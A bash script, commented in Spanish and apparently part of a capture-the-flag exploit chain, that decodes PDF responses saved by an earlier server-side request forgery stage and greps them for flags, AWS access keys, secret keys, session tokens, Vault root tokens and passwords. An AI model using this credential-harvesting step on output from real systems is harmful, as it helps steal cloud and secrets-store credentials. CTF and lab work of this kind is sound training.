#!/usr/bin/env bash
# Decodificar todos los PDFs generados por Stage 4 y buscar flags / credenciales
set -euo pipefail
source "$(dirname "$0")/00_config.sh"

if ! command -v pdftotext >/dev/null 2>&1; then
  echo "[!] Falta pdftotext."
  echo "    Instala: apt install -y poppler-utils"
  exit 1
fi

OUT="${LOOT_DIR}/pdf_text_dump.txt"
: > "${OUT}"

# Si no hay archivos resp_*.bin, recordar al usuario
shopt -s nullglob
files=("${LOOT_DIR}"/resp_*.bin)
if [[ ${#files[@]} -eq 0 ]]; then
  echo "[!] No hay ${LOOT_DIR}/resp_*.bin"
  echo "    Corre primero: bash 22_stage4_template_ssrf.sh"
  exit 1
fi

for f in "${files[@]}"; do
  name=$(basename "${f}" .bin)
  echo "###################### ${name} ######################" | tee -a "${OUT}"

  # Algunos respuestas son JSON con pdf_base64, otras son texto plano
  ct=$(head -c 1 "${f}")
  if [[ "${ct}" == "{" ]]; then
    jq -r '.pdf_base64 // empty' "${f}" 2>/dev/null | base64 -d > /tmp/_p.pdf 2>/dev/null
  else
    cp "${f}" /tmp/_p.pdf
  fi

  if [[ -s /tmp/_p.pdf ]] && head -c 4 /tmp/_p.pdf | grep -q '%PDF'; then
    pdftotext -layout /tmp/_p.pdf - 2>/dev/null | tee -a "${OUT}"
  else
    echo "[no PDF — raw response below]" | tee -a "${OUT}"
    head -c 800 "${f}" | tee -a "${OUT}"
    echo | tee -a "${OUT}"
  fi
  echo | tee -a "${OUT}"
  echo "---" | tee -a "${OUT}"
done

echo
echo "=========================================="
echo "[*] FLAGS encontradas:"
echo "=========================================="
grep -oE 'FLAG\{[^}]+\}' "${OUT}" | sort -u

echo
echo "=========================================="
echo "[*] AWS Keys / Tokens:"
echo "=========================================="
grep -oE 'AKIA[A-Z0-9]+|ASIA[A-Z0-9]+' "${OUT}" | sort -u
grep -iE '"(access_key|secret_key|secret_access_key|access_key_id|token|expiration)"' "${OUT}" | sort -u | head -20

echo
echo "=========================================="
echo "[*] Vault / credenciales / secrets:"
echo "=========================================="
grep -iE '(vault|secret|password|credential|cred|token|root_token)' "${OUT}" | sort -u | head -20

echo
echo "[+] Texto completo en ${OUT}"
echo "[+] Para revisar manualmente: less ${OUT}"
